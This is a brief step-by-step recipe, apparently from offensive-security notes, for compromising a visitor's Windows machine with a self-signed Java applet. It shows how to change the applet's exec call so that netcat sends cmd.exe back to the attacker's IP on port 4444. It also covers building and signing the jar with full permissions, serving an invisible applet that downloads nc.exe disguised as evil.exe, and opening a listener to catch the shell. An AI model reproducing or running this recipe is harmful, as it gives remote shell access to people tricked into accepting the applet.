#Java Applet run from browser
Will give warning message but users may just click yes

1. Modify the `Java.java` applet as required, in this case I change `f = Runtime.getRuntime().exec("cmd.exe /c " + expath);` to `f = Runtime.getRuntime().exec("cmd.exe /c " + expath + "YO.UR.IP.ADR 4444 -e cmd.exe");`

2. Create a manifest file using `echo "Permissions: all-permisions" > /root/manifest.txt`

3. Compile the code using `javac Java.java` then `jar cvfm Java.jar /root/manifest.txt Java.class`

4. Then generate a key `keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123` answering the questions as you see fit

5. And sign the applet `jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedJar SignedJava.jar Java.jar signapplet`

6. Copy the files to your web root `cp Java.class SignedJava.jar /var/www`

7. Then create a html file to serve your applet `echo	'<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://YO.UR.IP.ADR:80/evil.exe"></applet>' > /var/www/java.html`

8. Find windows nc `locate nc.exe`

9. Copy the payload (netcat in this case) `cp /usr/share/windows-binaries/nc.exe /var/www/evil.exe`

10. Create a listener `nc -lvp 4444`

11. Ensure apache is up using `service apache2 start`

On the victims box

11. Browse to your applet and watch for a shell
